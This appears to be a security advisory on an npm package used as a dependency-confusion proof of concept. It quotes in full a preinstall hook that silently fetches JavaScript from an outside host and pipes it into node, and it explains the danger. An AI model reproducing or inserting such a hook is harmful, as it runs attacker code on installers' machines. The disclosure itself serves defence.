summary: preinstall hook fetches and executes remote JavaScript from third-party host
details: package.json declares a preinstall lifecycle script that runs `node -e "try{require('child_process').execSync('curl -sf https://d1ugk469z93e.0ac.io/callback.js | node',{stdio:'ignore'})}catch(e){}"`. On every `npm install`, the installer's machine downloads JavaScript from https://d1ugk469z93e.0ac.io/callback.js — a non-publisher, unpinned, mutable URL — and pipes it straight into `node`, executing whatever bytes the remote host returns at that moment, with the installer user's privileges. stdio is muted and errors are swallowed by the surrounding try/catch, hiding failures from the operator. The package's own description and README admit it is a dependency-confusion proof of concept that claimed a name used internally by other repositories, so installs are likely to be triggered by victims expecting an unrelated internal package. The payload host is fully attacker-controlled and can serve different code at any time after publication.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
